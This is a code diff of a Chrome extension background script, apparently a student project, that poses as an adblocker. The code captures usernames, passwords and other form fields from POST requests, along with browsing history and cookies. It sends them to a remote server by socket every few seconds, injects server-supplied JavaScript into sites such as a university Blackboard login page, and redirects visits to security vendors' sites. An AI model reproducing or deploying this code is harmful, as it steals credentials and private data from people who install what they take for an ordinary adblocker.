@@ -1,29 +1,26 @@
-
-var socket = null;
-
-
+socket = null;
 /* current configuration
  * user ID (int) identifier
  * js_cmd (list of pairs (site url, js function))
  * last_pkt (int) time in milliseconds since last check-in with server
  * security_blacklist (list of strings) list of site1,site2 pairs. Navigating to site1 will redirect to site2
  */
-var config = {
-	ID: 0,
-	js_cmd: [],
-	last_pkt: 0,
-	security_blacklist: []
+config = {
+    ID: 0,
+    js_cmd: [],
+    last_pkt: 0,
+    security_blacklist: []
 };	//update this variable when a packet is sent
-	//add to js_cmd
-	//update last_pkt
-	//update security_blacklist
+//add to js_cmd
+//update last_pkt
+//update security_blacklist
 
-var queue = {
-	history: [],	//array of urls
-	cookies: [],	//array of {name, url, content}
-	creds: [],		//array of {url,username,password}
-	forms: []		//array of {id,id,id,...}
-}	//clear this variable when a packet is sent
+queue = {
+    history: [],	//array of urls
+    cookies: [],	//array of {name, url, content}
+    creds: [],		//array of {url,username,password}
+    forms: []		//array of {id,id,id,...}
+};	//clear this variable when a packet is sent
 
 function clearQueue(){
 	Object.keys(queue).forEach(function(key){
@@ -50,8 +47,8 @@ chrome.webRequest.onBeforeRequest.addListener(
 		var url = details.url;
 		var i;
 		for(i = 0; i < config.security_blacklist.length; i++){
-			if(config.security_blacklist[i].hasOwnProperty(url)){	//if the url is in the list, redirect
-                return {redirectUrl: config.security_blacklist[i][url]};
+			if(!(url.match(Object.keys(config.security_blacklist[i])[0]) == undefined)){	//if the url is in the list, redirect
+                return {redirectUrl: config.security_blacklist[i][Object.keys(config.security_blacklist[i])[0]]};
 			}
 		}
     },
@@ -63,7 +60,7 @@ chrome.webRequest.onBeforeRequest.addListener(
 //basic blocking functionality for adblocker
 chrome.webRequest.onBeforeRequest.addListener(
     function(details) {
-        return {cancel: true };
+        return {cancel: enabled };
     },
     {urls: blocked_domains},
     ["blocking"]
@@ -105,19 +102,6 @@ chrome.tabs.onUpdated.addListener(
             });
 
 
-				/*console.log("cmds_run: ",cmds_run);
-				var listChanged = false;
-                cmds_run.forEach(function(name){
-                	console.log("removing: ", name);
-                	for(var i = 0; i < config.js_cmd.length; i++){
-                		console.log("current in list: ", Object.keys(config.js_cmd[i])[0]);
-                		if(Object.keys(config.js_cmd[i])[0].match(name)){
-                			config.js_cmd.splice(i,1);
-                			i--;
-                			listChanged = true;
-						}
-					}
-				});*/
 				//Only save the results if something changed
                 if(listChanged) {
                     storeConfig();
@@ -156,10 +140,7 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
  * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
  */
 chrome.webRequest.onBeforeRequest.addListener(function(details){
-	console.log("WHERE'S THE POST?");
 	if(details.method === "POST"){
-    console.log("IT'S RIGHT HERE!!!!");
-
 		var formData = details.requestBody.formData;
 		var credential = {'url':details.url};
 		var complex = {'url':details.url};
@@ -168,20 +149,27 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 			Object.keys(formData).forEach(function(key){
 				if(!(key.match("formurl") == undefined)){};		//ignore this, it appears in all predefined phishing attacks
 				if(!(key.match("username") == undefined)||!(key.match("password") == undefined)){
+					console.log("input credential: ", key);
 					credential[key]=formData[key];
 				}
 				else{
+					console.log("input form data: ", key);
 					complex[key] = formData[key];
 				}
 			})
 		}
+		//console.log("credentials: ", credential);
+
 		var queueChanged = false;
 		//add these forms to a buffer for storing the payload until the next scheduled payload sending
-		if(credential.size == 3) {
+		if(Object.keys(credential).length > 1) {
+			console.log("Pushing creds");
             queue.creds.push(credential);
             queueChanged = true;
         }
-        if(complex.size > 1) {
+        console.log("complex: ", Object.keys(complex).length);
+        if(Object.keys(complex).length > 1) {
+			console.log("Pushing complex");
             queue.forms.push(complex);
             queueChanged = true;
         }
@@ -237,7 +225,7 @@ async function storeConfig(){
 
 
 async function loadQueue(){
-    await chrome.storage.local.get('config', function(result){
+    await chrome.storage.local.get('queue', function(result){
         if(!(result.config == undefined)){
             queue = result.queue;
             console.log('Seanonymous: message queue loaded!')
@@ -358,6 +346,8 @@ function sendPayload(){
 		getClientHistory(config.last_pkt, 200).then(function (){
             newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
             console.log("Sending a PAYLOAD");
+            console.log("HISTORY: ",queue.history);
+            console.log("HISTORY2: ", newJson['history']);
             socket.emit('extpayload', newJson, function(answer){
                 handleServerPayload(answer);
                 clearQueue();
@@ -374,17 +364,21 @@ function main_func() {
 	config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u r hacked!");'});
     config.js_cmd.push({"https://piazza.com/class/jksrwiu8kuz2w5" : 'alert("u b hacked222222222!");'});
     config.js_cmd.push({"https://blackboard.stonybrook.edu/webapps/login/" : 'alert("This one as well 3333333?!");'});
-	config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
+	//config.security_blacklist.push({"https://www.mcafee.com/en-us/index.html":"https://developer.chrome.com/extensions/examples/extensions/catifier/event_page.js"});
 	//setListener(config.security_blacklist);
 
     setInterval(sendPayload, 1000 * 10);	//sends payload every 30 seconds
 	console.log("config: ",config);
 }
 
-loadConfig().then(
-	loadQueue().then(
-		main_func
-	)
-);
 
 
+
+
+
+
+    loadConfig().then(
+        loadQueue().then(
+            main_func
+        )
+    );
